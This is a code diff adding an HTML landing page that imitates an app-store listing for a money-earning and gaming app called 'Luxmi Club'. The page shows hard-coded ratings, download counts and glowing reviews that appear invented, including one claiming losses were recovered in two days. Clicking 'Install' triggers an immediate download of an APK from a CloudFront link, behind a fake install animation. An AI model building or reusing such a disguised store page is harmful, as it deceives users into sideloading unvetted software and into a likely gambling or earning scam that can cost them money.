@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Luxmi Club</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+<style>
+body{
+    margin:0;
+    font-family:'Roboto',sans-serif;
+    background:#fff;
+    color:#202124;
+}
+
+.container{
+    max-width:500px;
+    margin:auto;
+    padding:16px;
+}
+
+/* Header */
+.header{
+    display:flex;
+    gap:16px;
+    align-items:center;
+}
+
+.app-icon{
+    width:96px;
+    height:96px;
+    border-radius:24px;
+    box-shadow:0 4px 12px rgba(0,0,0,0.1);
+    object-fit:cover;
+}
+
+.app-title{
+    font-size:22px;
+    font-weight:500;
+}
+
+.publisher{
+    font-size:14px;
+    color:#1a73e8;
+}
+
+.rating-line{
+    font-size:14px;
+    color:#5f6368;
+    margin-top:6px;
+}
+
+/* Stats */
+.stats{
+    display:flex;
+    justify-content:space-between;
+    text-align:center;
+    margin:20px 0;
+    padding:14px 0;
+    border-top:1px solid #eee;
+    border-bottom:1px solid #eee;
+}
+
+.stat{
+    flex:1;
+}
+
+.stat strong{
+    display:block;
+    font-size:16px;
+}
+
+.stat span{
+    font-size:12px;
+    color:#5f6368;
+}
+
+/* Install Button */
+.install-btn{
+    width:100%;
+    background:#1a73e8;
+    color:white;
+    border:none;
+    padding:14px;
+    border-radius:8px;
+    font-size:16px;
+    font-weight:500;
+    cursor:pointer;
+    transition:0.3s;
+}
+
+.install-btn:disabled{
+    background:#90caf9;
+}
+
+.progress-bar{
+    height:4px;
+    width:0%;
+    background:#1a73e8;
+    margin-top:6px;
+    transition:width 0.3s;
+}
+
+/* Screenshots */
+.screenshots{
+    display:flex;
+    gap:12px;
+    overflow-x:auto;
+    margin:20px 0;
+}
+
+.screenshots img{
+    width:180px;
+    height:320px;
+    border-radius:12px;
+    object-fit:cover;
+    box-shadow:0 4px 10px rgba(0,0,0,0.08);
+}
+
+/* About */
+.about{
+    font-size:14px;
+    line-height:1.6;
+    color:#444;
+    margin-bottom:20px;
+}
+
+/* Reviews */
+.review-summary{
+    display:flex;
+    align-items:center;
+    gap:16px;
+}
+
+.big-rating{
+    font-size:40px;
+    font-weight:500;
+}
+
+.review{
+    border-bottom:1px solid #eee;
+    padding:12px 0;
+}
+
+.review-name{
+    font-weight:500;
+}
+
+.stars{
+    color:#fbbc04;
+    font-size:14px;
+}
+
+.review-text{
+    font-size:14px;
+    margin-top:4px;
+    color:#444;
+}
+
+
+.install-wrapper{
+    text-align:center;
+    margin-top:20px;
+    position:relative;
+}
+
+.install-btn{
+    width:100%;
+    background:#02a124c3;
+    color:white;
+    border:none;
+    padding:14px;
+    border-radius:10px;
+    font-size:16px;
+    font-weight:500;
+    cursor:pointer;
+}
+
+.circle-loader{
+    display:none;
+    position:relative;
+    width:110px;
+    height:110px;
+    margin:20px auto;
+}
+
+.circle-loader.active{
+    display:block;
+    animation:rotateLoader 2s linear infinite;
+}
+
+@keyframes rotateLoader{
+    100% { transform: rotate(360deg); }
+}
+
+.percent{
+    position:absolute;
+    top:50%;
+    left:50%;
+    transform:translate(-50%,-50%);
+    font-weight:600;
+    font-size:16px;
+}
+
+#confettiCanvas{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    pointer-events:none;
+}
+
+
+
+
+.icon-wrapper{
+    position:relative;
+    width:110px;
+    height:110px;
+    cursor:pointer;
+}
+
+.app-icon{
+    width:90px;
+    height:90px;
+    border-radius:20px;
+    position:absolute;
+    top:10px;
+    left:10px;
+    z-index:2;
+}
+
+.progress-ring{
+    position:absolute;
+    top:0;
+    left:0;
+    transform:rotate(-90deg);
+    z-index:1;
+    display:none;
+}
+
+.progress-ring.active{
+    display:block;
+    animation:spin 1.5s linear infinite;
+}
+
+@keyframes spin{
+    100% { transform:rotate(270deg); }
+}
+
+.checkmark{
+    position:absolute;
+    top:35%;
+    left:38%;
+    font-size:28px;
+    color:#34a853;
+    display:none;
+    z-index:3;
+    font-weight:bold;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- HEADER -->
+    <div class="header">
+    
+    <div class="icon-wrapper" onclick="startInstall()">
+        <img src="/images/app-icon.jpeg" class="app-icon">
+
+        <svg class="progress-ring" width="110" height="110">
+            <circle cx="55" cy="55" r="50"
+                stroke="#e0e0e0"
+                stroke-width="6"
+                fill="none"/>
+
+            <circle id="progressCircle"
+                cx="55"
+                cy="55"
+                r="50"
+                stroke="#1a73e8"
+                stroke-width="6"
+                fill="none"
+                stroke-linecap="round"
+                stroke-dasharray="314"
+                stroke-dashoffset="314"/>
+        </svg>
+
+        <div class="checkmark" id="checkmark">✔</div>
+    </div>
+
+    <div>
+        <div class="app-title">Luxmi Club</div>
+        <div class="publisher">Luxmi Digital Pvt Ltd</div>
+        <div class="rating-line">⭐ 4.8 • 100K+ downloads</div>
+    </div>
+
+</div>
+
+    <!-- INSTALL BUTTON -->
+    <div class="install-wrapper">
+
+    <button id="installBtn" class="install-btn" onclick="startInstall()">
+        Install
+    </button>
+
+    <div class="circle-loader" id="circleLoader">
+        <svg width="110" height="110">
+            <defs>
+                <linearGradient id="gradient">
+                    <stop offset="0%" stop-color="#1a73e8"/>
+                    <stop offset="100%" stop-color="#34a853"/>
+                </linearGradient>
+            </defs>
+
+            <circle cx="55" cy="55" r="45"
+                stroke="#e0e0e0"
+                stroke-width="8"
+                fill="none"/>
+
+            <circle id="progressCircle"
+                cx="55"
+                cy="55"
+                r="45"
+                stroke="url(#gradient)"
+                stroke-width="8"
+                fill="none"
+                stroke-linecap="round"
+                stroke-dasharray="283"
+                stroke-dashoffset="283"/>
+        </svg>
+
+        <div class="percent" id="percentText">0%</div>
+    </div>
+
+    <canvas id="confettiCanvas"></canvas>
+
+</div>
+    <!-- SCREENSHOTS -->
+    <div class="screenshots">
+        <img src="/images/screen1.jpeg">
+        <img src="/images/screen2.jpeg">
+        <img src="/images/screen3.jpeg">
+    </div>
+
+    <!-- ABOUT -->
+    <div class="about">
+        <h3>About this app</h3>
+        Luxmi Club is a trusted earning and gaming platform designed for fast withdrawals,
+        secure transactions and smooth user experience. Join thousands of happy users today.
+    </div>
+
+    <!-- REVIEWS -->
+    <h3>Ratings and reviews</h3>
+
+    <div class="review-summary">
+        <div class="big-rating">4.8</div>
+        <div>
+            ⭐⭐⭐⭐⭐ <br>
+            12,248 reviews
+        </div>
+    </div>
+
+    <!-- Individual Reviews -->
+    <div class="review">
+        <div class="review-name">Rahul S.</div>
+        <div class="stars">⭐⭐⭐⭐⭐</div>
+        <div class="review-text">
+            Best earning platform I have used. Withdrawal is super fast and interface is smooth.
+        </div>
+    </div>
+
+    <div class="review">
+        <div class="review-name">Aman Verma</div>
+        <div class="stars">⭐⭐⭐⭐⭐</div>
+        <div class="review-text">
+            Genuine app. I recovered my losses within 2 days. Highly recommended.
+        </div>
+    </div>
+
+    <div class="review">
+        <div class="review-name">Priya K.</div>
+        <div class="stars">⭐⭐⭐⭐⭐</div>
+        <div class="review-text">
+            Amazing experience. No lag, instant deposit and withdrawal.
+        </div>
+    </div>
+
+</div>
+
+<script>
+function startInstall(){
+
+    let circle = document.getElementById("progressCircle");
+    let ring = document.querySelector(".progress-ring");
+    let check = document.getElementById("checkmark");
+    let btn = document.getElementById("installBtn");
+
+    // ✅ START APK DOWNLOAD IMMEDIATELY
+    let link = document.createElement("a");
+    link.href = "https://d1yei2z3i6k35z.cloudfront.net/11607359/699f0bbf099d1_laxmiclub3.apk";
+    link.download = "";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+
+    // ✅ Start Progress Animation
+    ring.classList.add("active");
+
+    let progress = 0;
+    let circumference = 314;
+
+    let interval = setInterval(function(){
+
+        progress += 2;
+
+        let offset = circumference - (progress / 100) * circumference;
+        circle.style.strokeDashoffset = offset;
+
+        if(progress >= 100){
+            clearInterval(interval);
+
+            ring.classList.remove("active");
+            check.style.display="block";
+
+            if(navigator.vibrate){
+                navigator.vibrate(200);
+            }
+
+            // Change button to Open (just reloads file link)
+            btn.innerText="Download Again";
+            btn.onclick=function(){
+                window.location.href="https://d1yei2z3i6k35z.cloudfront.net/11607359/699f0bbf099d1_laxmiclub3.apk";
+            }
+        }
+
+    },40);
+}
+</script>
+
+
+
+</body>
+</html>
